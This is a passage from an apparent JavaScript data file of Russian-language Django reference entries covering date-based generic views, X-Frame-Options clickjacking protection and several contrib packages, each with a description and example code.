      "Класс django.views.generic.dates.DateDetailView — расширение DetailView с дополнительной валидацией по дате: объект ищется не только по pk/slug, но и должен принадлежать указанной в URL дате (year, month, day). Если дата объекта не совпадает с URL — 404. Полезно для канонических URL вида /blog/2024/03/15/my-post/. Шаблон по умолчанию — <app>/<model>_detail.html (как у DetailView).",
    syntax: `from django.views.generic.dates import DateDetailView

class ArticleDateDetail(DateDetailView):
    model = Article
    date_field = 'published_at'`,
    arguments: [],
    example: `from django.views.generic.dates import DateDetailView
from .models import Article

class ArticleDateDetail(DateDetailView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'           # число вместо abbr
    slug_field = 'slug'
    slug_url_kwarg = 'slug'
    allow_future = False

# urls.py — URL содержит и дату, и slug
# path(
#     'blog/<int:year>/<int:month>/<int:day>/<slug:slug>/',
#     ArticleDateDetail.as_view(),
#     name='article-date-detail',
# )

# Логика обработки запроса /blog/2024/03/15/my-post/:
#   1. Загружаем Article по slug='my-post'
#   2. Проверяем: published_at.year == 2024 AND month == 3 AND day == 15
#   3. Если не совпадает → Http404
# Это защищает от неканонических URL: пользователь не сможет открыть статью
# с любой произвольной датой в пути.

# templates/<app>/article_detail.html (стандартный)
# <h1>{{ object.title }}</h1>
# <time datetime="{{ object.published_at|date:'c' }}">
#   {{ object.published_at|date:'j F Y' }}
# </time>
# <div>{{ object.body|linebreaks }}</div>`,
  },
  {
    name: "BaseArchiveIndexView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.dates.BaseArchiveIndexView — реализует логику ArchiveIndexView (последние объекты + список периодов через QuerySet.dates()) без миксина рендеринга шаблона. Прямой родитель ArchiveIndexView (= BaseArchiveIndexView + MultipleObjectTemplateResponseMixin). Используется для возврата JSON, RSS-фидов и других нестандартных форматов на основе архивных данных.",
    syntax: `from django.views.generic.dates import BaseArchiveIndexView

class ArchiveAPI(BaseArchiveIndexView):
    model = Article
    date_field = 'published_at'`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.dates import BaseArchiveIndexView
from .models import Article

class ArticleArchiveAPI(BaseArchiveIndexView):
    model = Article
    date_field = 'published_at'
    date_list_period = 'year'
    allow_future = False

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'years': [d.year for d in context['date_list']],
            'latest': [
                {'id': a.pk, 'title': a.title}
                for a in context['latest']
            ],
        })

# urls.py
# path('api/archive/', ArticleArchiveAPI.as_view())

# ArchiveIndexView      = BaseArchiveIndexView + MultipleObjectTemplateResponseMixin
# BaseArchiveIndexView  = BaseDateListView (без шаблонов)`,
  },
  {
    name: "BaseYearArchiveView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.dates.BaseYearArchiveView — реализует логику YearArchiveView (объекты года + список месяцев) без миксина рендеринга шаблона. Прямой родитель YearArchiveView (= BaseYearArchiveView + MultipleObjectTemplateResponseMixin). Поддерживает make_object_list/get_make_object_list() для опционального включения object_list в контекст.",
    syntax: `from django.views.generic.dates import BaseYearArchiveView

class YearArchiveAPI(BaseYearArchiveView):
    model = Article
    date_field = 'published_at'
    make_object_list = True`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.dates import BaseYearArchiveView
from .models import Article

class ArticleYearAPI(BaseYearArchiveView):
    model = Article
    date_field = 'published_at'
    make_object_list = True
    allow_future = False

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'year': context['year'].year,
            'months': [d.month for d in context['date_list']],
            'next_year': context['next_year'].year if context['next_year'] else None,
            'previous_year': context['previous_year'].year if context['previous_year'] else None,
            'articles': [
                {'id': a.pk, 'title': a.title, 'date': a.published_at.isoformat()}
                for a in context['object_list']
            ],
        })

# urls.py
# path('api/archive/<int:year>/', ArticleYearAPI.as_view())

# YearArchiveView      = BaseYearArchiveView + MultipleObjectTemplateResponseMixin
# BaseYearArchiveView  = YearMixin + BaseDateListView (без шаблонов)`,
  },
  {
    name: "BaseMonthArchiveView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.dates.BaseMonthArchiveView — реализует логику MonthArchiveView (объекты месяца + список дней с публикациями) без миксина рендеринга шаблона. Прямой родитель MonthArchiveView (= BaseMonthArchiveView + MultipleObjectTemplateResponseMixin). Используется для JSON-API, календарных виджетов и подобных нестандартных ответов.",
    syntax: `from django.views.generic.dates import BaseMonthArchiveView

class MonthArchiveAPI(BaseMonthArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.dates import BaseMonthArchiveView
from .models import Article

# Календарный JSON-эндпоинт: какие дни месяца содержат публикации
class CalendarMonthAPI(BaseMonthArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'
    allow_empty = True
    allow_future = False

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'month': context['month'].isoformat(),
            'days_with_posts': [d.day for d in context['date_list']],
            'count': len(context['object_list']),
            'next_month': context['next_month'].isoformat() if context['next_month'] else None,
            'previous_month': context['previous_month'].isoformat() if context['previous_month'] else None,
        })

# urls.py
# path('api/calendar/<int:year>/<int:month>/', CalendarMonthAPI.as_view())

# MonthArchiveView      = BaseMonthArchiveView + MultipleObjectTemplateResponseMixin
# BaseMonthArchiveView  = YearMixin + MonthMixin + BaseDateListView (без шаблонов)`,
  },
  {
    name: "BaseWeekArchiveView",
    category: "Built-in class-based views API",
    description:
      'Базовый класс django.views.generic.dates.BaseWeekArchiveView — реализует логику WeekArchiveView (объекты указанной недели) без миксина рендеринга шаблона. Прямой родитель WeekArchiveView (= BaseWeekArchiveView + MultipleObjectTemplateResponseMixin). Поддерживает week_format для выбора стандарта нумерации недель ("%U", "%W", "%V").',
    syntax: `from django.views.generic.dates import BaseWeekArchiveView

class WeekArchiveAPI(BaseWeekArchiveView):
    model = Article
    date_field = 'published_at'
    week_format = '%W'`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.dates import BaseWeekArchiveView
from .models import Article

class ArticleWeekAPI(BaseWeekArchiveView):
    model = Article
    date_field = 'published_at'
    week_format = '%W'           # неделя с понедельника
    allow_future = False

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'week_start': context['week'].isoformat(),
            'next_week': context['next_week'].isoformat() if context['next_week'] else None,
            'previous_week': context['previous_week'].isoformat() if context['previous_week'] else None,
            'articles': [
                {'id': a.pk, 'title': a.title, 'date': a.published_at.isoformat()}
                for a in context['object_list']
            ],
        })

# urls.py
# path('api/week/<int:year>/<int:week>/', ArticleWeekAPI.as_view())

# WeekArchiveView      = BaseWeekArchiveView + MultipleObjectTemplateResponseMixin
# BaseWeekArchiveView  = YearMixin + WeekMixin + BaseDateListView (без шаблонов)`,
  },
  {
    name: "BaseDayArchiveView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.dates.BaseDayArchiveView — реализует логику DayArchiveView (объекты указанного дня) без миксина рендеринга шаблона. ПрямѾй родитель DayArchiveView (= BaseDayArchiveView + MultipleObjectTemplateResponseMixin) и BaseTodayArchiveView. Используется для JSON-эндпоинтов вида /api/posts/2024/03/15/.",
    syntax: `from django.views.generic.dates import BaseDayArchiveView

class DayArchiveAPI(BaseDayArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.dates import BaseDayArchiveView
from .models import Article

class ArticleDayAPI(BaseDayArchiveView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'
    day_format = '%d'
    allow_future = False
    allow_empty = True

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'day': context['day'].isoformat(),
            'next_day': context['next_day'].isoformat() if context['next_day'] else None,
            'previous_day': context['previous_day'].isoformat() if context['previous_day'] else None,
            'articles': [
                {'id': a.pk, 'title': a.title, 'slug': a.slug}
                for a in context['object_list']
            ],
        })

# urls.py
# path('api/posts/<int:year>/<int:month>/<int:day>/', ArticleDayAPI.as_view())

# DayArchiveView      = BaseDayArchiveView + MultipleObjectTemplateResponseMixin
# BaseDayArchiveView  = YearMixin + MonthMixin + DayMixin + BaseDateListView`,
  },
  {
    name: "BaseTodayArchiveView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.dates.BaseTodayArchiveView — реализует логику TodayArchiveView (объекты, опубликованные сегодня) без миксина рендеринга шаблона. Прямой родитель TodayArchiveView (= BaseTodayArchiveView + MultipleObjectTemplateResponseMixin). Не требует параметров в URL — использует datetime.date.today().",
    syntax: `from django.views.generic.dates import BaseTodayArchiveView

class TodayArchiveAPI(BaseTodayArchiveView):
    model = Article
    date_field = 'published_at'`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.dates import BaseTodayArchiveView
from .models import Article

# JSON «лента сегодняшнего дня» — например, для виджета на главной
class TodayFeedAPI(BaseTodayArchiveView):
    model = Article
    date_field = 'published_at'
    allow_empty = True
    ordering = ['-published_at']

    def render_to_response(self, context, **response_kwargs):
        return JsonResponse({
            'date': context['day'].isoformat(),
            'count': len(context['object_list']),
            'articles': [
                {
                    'id': a.pk,
                    'title': a.title,
                    'time': a.published_at.strftime('%H:%M'),
                }
                for a in context['object_list']
            ],
        })

# urls.py — без параметров year/month/day
# path('api/today/', TodayFeedAPI.as_view())

# TodayArchiveView      = BaseTodayArchiveView + MultipleObjectTemplateResponseMixin
# BaseTodayArchiveView  = BaseDayArchiveView (с подстановкой today())`,
  },
  {
    name: "BaseDateDetailView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.dates.BaseDateDetailView — реализует логику DateDetailView (загрузка объекта по pk/slug + проверка, что его дата совпадает с year/month/day из URL) без миксина рендеринга шаблона. Прямой родитель DateDetailView (= BaseDateDetailView + SingleObjectTemplateResponseMixin). Используется для JSON-API с каноническими date-based URL вида /api/posts/2024/03/15/my-post/.",
    syntax: `from django.views.generic.dates import BaseDateDetailView

class DateDetailAPI(BaseDateDetailView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.dates import BaseDateDetailView
from .models import Article

class ArticleDateDetailAPI(BaseDateDetailView):
    model = Article
    date_field = 'published_at'
    month_format = '%m'
    slug_field = 'slug'
    slug_url_kwarg = 'slug'
    allow_future = False

    def render_to_response(self, context, **response_kwargs):
        a = context['object']
        return JsonResponse({
            'id': a.pk,
            'title': a.title,
            'body': a.body,
            'slug': a.slug,
            'published_at': a.published_at.isoformat(),
            'author': a.author.username,
        })

# urls.py — каноническая структура с датой и slug
# path(
#     'api/posts/<int:year>/<int:month>/<int:day>/<slug:slug>/',
#     ArticleDateDetailAPI.as_view(),
# )

# Запрос /api/posts/2024/03/15/my-post/:
#   1. Загружается Article(slug='my-post')
#   2. Проверяется published_at.year/month/day == 2024/3/15
#   3. Несовпадение → Http404 (страница не существует с такой датой)

# DateDetailView      = BaseDateDetailView + SingleObjectTemplateResponseMixin
# BaseDateDetailView  = YearMixin + MonthMixin + DayMixin + DateMixin + BaseDetailView`,
  },
  {
    name: "XFrameOptionsMiddleware",
    category: "Clickjacking Protection",
    description:
      'Класс django.middleware.clickjacking.XFrameOptionsMiddleware — middleware, который автоматически добавляет HTTP-заголовок X-Frame-Options ко всем ответам, если заголовок не был задан явно. Защищает сайт от clickjacking-атак: запрещает встраивать страницы в <iframe>/<frame>/<object> на чужих доменах. Включён по умолчанию в SECURITY-настройках нового проекта Django. Значение заголовка определяется настройкой X_FRAME_OPTIONS (по умолчанию "DENY").',
    syntax: `# settings.py
MIDDLEWARE = [
    ...,
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]`,
    arguments: [],
    example: `# settings.py
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    # Защита от clickjacking — в новом проекте включён по умолчанию
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

# Глобальное значение для всех ответов:
X_FRAME_OPTIONS = 'DENY'        # запретить встраивание полностью
# X_FRAME_OPTIONS = 'SAMEORIGIN'  # разрешить только своему домену

# Логика middleware:
#   1. Если у response уже есть атрибут response.xframe_options_exempt = True
#      → middleware не трогает заголовок (декоратор xframe_options_exempt).
#   2. Если в response уже выставлен X-Frame-Options
#      → middleware не перезаписывает.
#   3. Иначе — выставляет X-Frame-Options = X_FRAME_OPTIONS.

# Проверить, что middleware работает:
#   curl -I https://example.com/
#   HTTP/1.1 200 OK
#   X-Frame-Options: DENY`,
  },
  {
    name: "xframe_options_deny(view)",
    category: "Clickjacking Protection",
    description:
      "Декоратор из django.views.decorators.clickjacking, принудительно устанавливающий X-Frame-Options: DENY для ответа конкретного представления — независимо от глобальной настройки X_FRAME_OPTIONS. Используется, когда сайт в целом разрешает SAMEORIGIN, но отдельные страницы (например, форма логина, страница оплаты) должны быть полностью защищены от встраивания.",
    syntax: `from django.views.decorators.clickjacking import xframe_options_deny

@xframe_options_deny
def my_view(request):
    ...`,
    arguments: [
      {
        name: "view",
        description:
          "Декорируемая view-функция. Декоратор оборачивает её и выставляет на ответе X-Frame-Options: DENY.",
      },
    ],
    example: `from django.shortcuts import render
from django.views.decorators.clickjacking import xframe_options_deny
from django.utils.decorators import method_decorator
from django.views import View

# Функциональное представление
@xframe_options_deny
def login_view(request):
    # Эту страницу невозможно встроить в iframe ни на одном домене
    return render(request, 'auth/login.html')

# CBV — через method_decorator
@method_decorator(xframe_options_deny, name='dispatch')
class PaymentView(View):
    def get(self, request):
        return render(request, 'payment/form.html')

# Глобальная настройка может быть SAMEORIGIN, но эти view всё равно DENY:
# settings.py: X_FRAME_OPTIONS = 'SAMEORIGIN'
#
# Запрос /login/ → X-Frame-Options: DENY
# Запрос /other/ → X-Frame-Options: SAMEORIGIN`,
  },
  {
    name: "xframe_options_sameorigin(view)",
    category: "Clickjacking Protection",
    description:
      "Декоратор из django.views.decorators.clickjacking, устанавливающий X-Frame-Options: SAMEORIGIN для ответа конкретного представления. Разрешает встраивание страницы в iframe только на том же домене (origin). Используется в обратной ситуации: глобально стоит DENY, но отдельным страницам нужно разрешить встраивание внутри собственного сайта (например, виджет, превью, админ-панель).",
    syntax: `from django.views.decorators.clickjacking import xframe_options_sameorigin

@xframe_options_sameorigin
def my_view(request):
    ...`,
    arguments: [
      {
        name: "view",
        description:
          "Декорируемая view-функция. Декоратор оборачивает её и выставляет на ответе X-Frame-Options: SAMEORIGIN.",
      },
    ],
    example: `from django.shortcuts import render
from django.views.decorators.clickjacking import xframe_options_sameorigin
from django.utils.decorators import method_decorator
from django.views.generic import TemplateView

# Виджет, который встраивается в админ-панель того же домена
@xframe_options_sameorigin
def stats_widget(request):
    return render(request, 'widgets/stats.html')

# CBV — через method_decorator
@method_decorator(xframe_options_sameorigin, name='dispatch')
class PreviewView(TemplateView):
    template_name = 'editor/preview.html'

# settings.py: X_FRAME_OPTIONS = 'DENY' (глобально)
#
# Запрос /widgets/stats/ → X-Frame-Options: SAMEORIGIN
#   - https://example.com/page/ может встроить /widgets/stats/ в <iframe>
#   - https://other.com/page/ — браузер заблокирует встраивание
# Запрос /any-other/ → X-Frame-Options: DENY (по умолчанию)`,
  },
  {
    name: "xframe_options_exempt(view)",
    category: "Clickjacking Protection",
    description:
      "Декоратор из django.views.decorators.clickjacking, помечающий ответ представления флагом xframe_options_exempt = True. XFrameOptionsMiddleware пропускает такие ответы и НЕ выставляет заголовок X-Frame-Options. Используется для страниц, которые должны быть встраиваемы кем угодно (виджеты, embed-плееры, публичные превью). Применять с осторожностью — отсутствие X-Frame-Options делает страницу уязвимой для clickjacking.",
    syntax: `from django.views.decorators.clickjacking import xframe_options_exempt

@xframe_options_exempt
def my_view(request):
    ...`,
    arguments: [
      {
        name: "view",
        description:
          "Декорируемая view-функция. Декоратор оборачивает её и устанавливает на ответе response.xframe_options_exempt = True, что заставляет XFrameOptionsMiddleware пропустить этот ответ.",
      },
    ],
    example: `from django.shortcuts import render
from django.views.decorators.clickjacking import xframe_options_exempt
from django.utils.decorators import method_decorator
from django.views.generic import DetailView
from .models import Video

# Embed-плеер, который должен встраиваться на любом сайте
@xframe_options_exempt
def video_embed(request, video_id):
    video = Video.objects.get(pk=video_id)
    return render(request, 'embed/video.html', {'video': video})

# CBV-вариант
@method_decorator(xframe_options_exempt, name='dispatch')
class WidgetEmbedView(DetailView):
    model = Video
    template_name = 'embed/widget.html'

# Запрос /embed/123/:
#   - response.xframe_options_exempt = True (выставлен декоратором)
#   - XFrameOptionsMiddleware видит флаг и НЕ добавляет заголовок
#   - Ответ уходит без X-Frame-Options
#   - Любой сайт может встроить страницу: <iframe src="…/embed/123/"></iframe>

# Внимание: страница без X-Frame-Options уязвима для clickjacking.
# Используйте только для контента, специально предназначенного для embed,
# и не размещайте на этих страницах форм с действиями (CSRF + clickjacking).`,
  },
  {
    name: "X_FRAME_OPTIONS",
    category: "Clickjacking Protection",
    description:
      'Настройка Django (settings.py), задающая значение HTTP-заголовка X-Frame-Options, которое XFrameOptionsMiddleware добавляет ко всем ответам. Допустимые значения: "DENY" (запретить встраивание полностью, значение по умолчанию начиная с Django 3.0) и "SAMEORIGIN" (разрешить встраивание только на собственном домене). Регистр значения не важен — Django приведёт его к верхнему. Значение "ALLOW-FROM uri" не поддерживается современными браузерами и Django его не использует.',
    syntax: `# settings.py
X_FRAME_OPTIONS = 'DENY'  # или 'SAMEORIGIN'`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# 1. Полный запрет встраивания (по умолчанию, рекомендуется)
X_FRAME_OPTIONS = 'DENY'
#   Люба � попытка <iframe src="https://example.com/"> блокируется браузером.

# 2. Разрешить встраивание только своему домену (для внутренних виджетов)
X_FRAME_OPTIONS = 'SAMEORIGIN'
#   https://example.com/admin/ может встраивать https://example.com/widget/
#   https://other.com/page/  не может — браузер заблокирует iframe.

# Точечные исключения через декораторы:
from django.views.decorators.clickjacking import (
    xframe_options_deny,
    xframe_options_sameorigin,
    xframe_options_exempt,
)

# Глобально SAMEORIGIN, но форма логина — строго DENY
@xframe_options_deny
def login(request): ...

# Глобально DENY, но один embed-плеер — без заголовка
@xframe_options_exempt
def embed(request): ...

# Проверка через curl:
#   $ curl -I https://example.com/
#   HTTP/1.1 200 OK
#   X-Frame-Options: DENY

# Современная альтернатива (более гибкая) — заголовок CSP frame-ancestors:
#   Content-Security-Policy: frame-ancestors 'self' https://partner.com;
# При наличии CSP frame-ancestors браузеры игнорируют X-Frame-Options.
# В Django CSP настраивается через сторонние пакеты (например, django-csp).`,
  },
  {
    name: "django.contrib.admin",
    category: "contrib packages",
    description:
      "Встроенная административная панель Django — автоматически сгенерированный веб-интерфейс для CRUD-операций над моделями. Регистрация моделей через admin.site.register() или декоратор @admin.register(). Поддерживает кастомизацию через ModelAdmin: list_display, list_filter, search_fields, fieldsets, inlines, actions. Требует контрибов auth, contenttypes, sessions и messages. Доступна по URL /admin/ после подключения admin.site.urls в URLconf.",
    syntax: `# settings.py
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    ...,
]`,
    arguments: [],
    example: `# admin.py
from django.contrib import admin
from .models import Article, Comment

@admin.register(Article)
class ArticleAdmin(admin.ModelAdmin):
    list_display = ('title', 'author', 'status', 'published_at')
    list_filter = ('status', 'category', 'published_at')
    search_fields = ('title', 'body')
    prepopulated_fields = {'slug': ('title',)}
    date_hierarchy = 'published_at'
    actions = ['publish_selected']

    fieldsets = (
        (None, {'fields': ('title', 'slug', 'body')}),
        ('Публикация', {'fields': ('status', 'published_at')}),
    )

    @admin.action(description='Опубликовать выбранные')
    def publish_selected(self, request, queryset):
        queryset.update(status='published')

class CommentInline(admin.TabularInline):
    model = Comment
    extra = 0

# urls.py
from django.contrib import admin
from django.urls import path
urlpatterns = [path('admin/', admin.site.urls)]

# Создание суперпользователя:
#   python manage.py createsuperuser`,
  },
  {
    name: "django.contrib.auth",
    category: "contrib packages",
    description:
      "Подсистема аутентификации и авторизации Django: модели User/Group/Permission, бэкенды аутентификации, middleware для request.user, готовые view для login/logout/password change/password reset, декораторы @login_required, @permission_required, миксины LoginRequiredMixin, PermissionRequiredMixin, UserPassesTestMixin. Поддерживает кастомные модели пользователя через AUTH_USER_MODEL.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.auth', 'django.contrib.contenttypes', ...]
MIDDLEWARE = [..., 'django.contrib.auth.middleware.AuthenticationMiddleware', ...]
AUTH_USER_MODEL = 'accounts.User'  # опционально`,
    arguments: [],
    example: `# Аутентификация
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required, permission_required

def my_login(request):
    user = authenticate(request, username='alice', password='secret')
    if user:
        login(request, user)

@login_required
def profile(request):
    return render(request, 'profile.html', {'user': request.user})

@permission_required('blog.add_article', raise_exception=True)
def new_article(request):
    ...

# CBV-миксины
from django.contrib.auth.mixins import LoginRequiredMixin, PermissionRequiredMixin

class DraftListView(LoginRequiredMixin, ListView):
    login_url = '/accounts/login/'
    model = Article

class AdminListView(PermissionRequiredMixin, ListView):
    permission_required = 'blog.view_article'
    model = Article

# Готовые URL для логина/логаута/смены пароля
# urls.py
from django.urls import path, include
urlpatterns = [path('accounts/', include('django.contrib.auth.urls'))]
# /accounts/login/, /accounts/logout/, /accounts/password_change/, /password_reset/`,
  },
  {
    name: "django.contrib.contenttypes",
    category: "contrib packages",
    description:
      "Подсистема, предоставляющая обобщённый интерфейс к моделям проекта. Создаёт таблицу django_content_type с записью для каждой зарегистрированной модели (app_label, model). Используется системой permissions, GenericForeignKey, redirects, admin log и любыми приложениями, которым нужно ссылаться на «любую модель». Ключевая модель — ContentType, ключевые поля — GenericForeignKey, GenericRelation.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.contenttypes', ...]`,
    arguments: [],
    example: `# Получить ContentType по модели
from django.contrib.contenttypes.models import ContentType
from .models import Article

ct = ContentType.objects.get_for_model(Article)
print(ct.app_label, ct.model)  # 'blog', 'article'

# Восстановить класс модели из ContentType
ModelClass = ct.model_class()                  # <class 'blog.models.Article'>
article = ct.get_object_for_this_type(pk=42)   # экземпляр Article

# GenericForeignKey — ссылка на любую модель
from django.contrib.contenttypes.fields import GenericForeignKey, GenericRelation
from django.contrib.contenttypes.models import ContentType
from django.db import models

class Tag(models.Model):
    name = models.CharField(max_length=50)
    content_type = models.ForeignKey(ContentType, on_delete=models.CASCADE)
    object_id = models.PositiveIntegerField()
    content_object = GenericForeignKey('content_type', 'object_id')

class Article(models.Model):
    title = models.CharField(max_length=200)
    tags = GenericRelation(Tag)   # обратная связь

# Использование
article = Article.objects.create(title='Hi')
Tag.objects.create(name='python', content_object=article)
print(article.tags.all())   # <QuerySet [<Tag: python>]>`,
  },
  {
    name: "django.contrib.flatpages",
    category: "contrib packages",
    description:
      "Простой CMS-модуль для редактирования статичных страниц через админку: «О нас», «Контакты», «Политика конфиденциальности». Каждая страница — это запись модели FlatPage с URL, заголовком, содержимым (HTML/markdown) и шаблоном. Доступ к страницам — через FlatpageFallbackMiddleware (отдаёт страницу, если не сработал URLconf) или явно через flatpage view. Требует contrib.sites.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.flatpages', 'django.contrib.sites', ...]
MIDDLEWARE = [..., 'django.contrib.flatpages.middleware.FlatpageFallbackMiddleware']
SITE_ID = 1`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = [
    'django.contrib.sites',
    'django.contrib.flatpages',
    ...,
]
SITE_ID = 1
MIDDLEWARE = [
    ...,
    'django.contrib.flatpages.middleware.FlatpageFallbackMiddleware',
]

# python manage.py migrate
# Затем в админке: Flat pages → Add flat page
#   URL:           /about/
#   Title:         О нас
#   Content:       <h1>Привет!</h1>
#   Sites:         example.com
#   Template name: flatpages/default.html (по умолчанию)

# templates/flatpages/default.html
# <html>
#   <head><title>{{ flatpage.title }}</title></head>
#   <body>{{ flatpage.content|safe }}</body>
# </html>

# Логика FlatpageFallbackMiddleware:
#   - URL не нашёлся в URLconf → 404
#   - middleware ловит 404 и ищет FlatPage с таким URL
#   - если нашёл — рендерит шаблон страницы

# Альтернатива — явный URL:
# urls.py
from django.urls import path
from django.contrib.flatpages import views
urlpatterns = [path('about/', views.flatpage, {'url': '/about/'})]`,
  },
  {
    name: "django.contrib.gis",
    category: "contrib packages",
    description:
      "GeoDjango — расширение для работы с геоданными: точки, линии, полигоны, расстояния, геокодирование. Поддерживает PostGIS (PostgreSQL), SpatiaLite (SQLite), Oracle Spatial, MySQL. Предоставляет геометрические поля моделей (PointField, PolygonField, LineStringField), QuerySet-операции (distance, intersects, within), GIS-формы и виджеты, OGR/GDAL для импорта shapefile/GeoJSON, geometry для админки.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.gis', ...]
DATABASES = {'default': {'ENGINE': 'django.contrib.gis.db.backends.postgis', ...}}`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = ['django.contrib.gis', ...]
DATABASES = {
    'default': {
        'ENGINE': 'django.contrib.gis.db.backends.postgis',
        'NAME': 'mydb', 'USER': 'me', 'PASSWORD': '...', 'HOST': 'localhost',
    }
}

# models.py
from django.contrib.gis.db import models

class Cafe(models.Model):
    name = models.CharField(max_length=100)
    location = models.PointField(geography=True, srid=4326)   # WGS84
    area = models.PolygonField(null=True)

# Создание объектов
from django.contrib.gis.geos import Point, Polygon
cafe = Cafe.objects.create(
    name='Кофейня',
    location=Point(37.6173, 55.7558),   # долгота, широта (Москва)
)

# Гео-запросы
from django.contrib.gis.measure import D
from django.contrib.gis.db.models.functions import Distance

point = Point(37.6, 55.75, srid=4326)

# Кафе в радиусе 1 км
nearby = Cafe.objects.filter(location__distance_lte=(point, D(km=1)))

# С расстоянием в результате, отсортированные по близости
sorted_cafes = (
    Cafe.objects.annotate(dist=Distance('location', point))
    .order_by('dist')[:10]
)`,
  },
  {
    name: "django.contrib.humanize",
    category: "contrib packages",
    description:
      "Набор шаблонных фильтров для «человеческого» представления данных: чисел, дат, временных интервалов. Включает intcomma (1,000,000), intword (1.0 million), apnumber (один…девять словами), naturalday (вчера/завтра/3 апреля), naturaltime (5 минут назад), ordinal (1-й, 2-й). Не требует моделей и middleware — только добавления в INSTALLED_APPS и {% load humanize %} в шаблоне.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.humanize', ...]

# template
{% load humanize %}
{{ value|intcomma }}`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = ['django.contrib.humanize', ...]

# templates/example.html
{% load humanize %}

# Числа
<p>{{ 1234567|intcomma }}</p>          # 1,234,567
<p>{{ 1500000|intword }}</p>           # 1.5 million
<p>{{ 5|apnumber }}</p>                # five
<p>{{ 3|ordinal }}</p>                 # 3rd

# Даты
{# today = 2024-03-15 #}
<p>{{ yesterday|naturalday }}</p>      # yesterday
<p>{{ next_week|naturalday }}</p>      # March 22
<p>{{ comment.created|naturaltime }}</p>  # 5 minutes ago, 2 hours ago

# Локализация — фильтры реагируют на текущий язык (LANGUAGE_CODE):
# settings.py
LANGUAGE_CODE = 'ru'
USE_I18N = True
# Тогда:
# {{ 1234567|intcomma }}  →  1 234 567
# {{ comment.created|naturaltime }}  →  5 минут назад

# В Python-коде (не только в шаблонах)
from django.contrib.humanize.templatetags.humanize import naturaltime, intcomma
print(naturaltime(timezone.now() - timedelta(minutes=5)))  # "5 минут назад"
print(intcomma(1234567))  # "1,234,567"`,
  },
  {
    name: "django.contrib.messages",
    category: "contrib packages",
    description:
      "Подсистема одноразовых сообщений (flash messages) — текст, который сохраняется между запросами и отображается пользователю один раз: «Сохранено», «Ошибка», «Добро пожаловать». Поддерживает уровни (DEBUG, INFO, SUCCESS, WARNING, ERROR), различные backend'ы хранения (session, cookie, fallback) и тегирование для CSS-классов. Требует SessionMiddleware (для session-backend) и MessageMiddleware.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.messages', ...]
MIDDLEWARE = [
    ..., 'django.contrib.sessions.middleware.SessionMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
]`,
    arguments: [],
    example: `# views.py
from django.contrib import messages
from django.shortcuts import redirect

def save_profile(request):
    if request.method == 'POST':
        # ...сохраняем...
        messages.success(request, 'Профиль обновлён.')
        return redirect('profile')

def delete_account(request):
    request.user.delete()
    messages.warning(request, 'Аккаунт удалён.')
    return redirect('home')

def buggy_view(request):
    messages.error(request, 'Не удалось обработать запрос.')
    messages.info(request, 'Попробуйте ещё раз через минуту.')
    return redirect('home')

# templates/base.html
# {% if messages %}
#   <ul class="messages">
#     {% for message in messages %}
#       <li class="alert alert-{{ message.tags }}">
#         {{ message }}
#       </li>
#     {% endfor %}
#   </ul>
# {% endif %}

# Уровни и теги по умолчанию:
#   messages.debug    → tag 'debug'
#   messages.info     → tag 'info'
#   messages.success  → tag 'success'
#   messages.warning  → tag 'warning'
#   messages.error    → tag 'error'

# Backend хранения (settings.py)
MESSAGE_STORAGE = 'django.contrib.messages.storage.session.SessionStorage'
# Альтернативы: cookie.CookieStorage, fallback.FallbackStorage`,
  },
  {
    name: "django.contrib.postgres",
    category: "contrib packages",
    description:
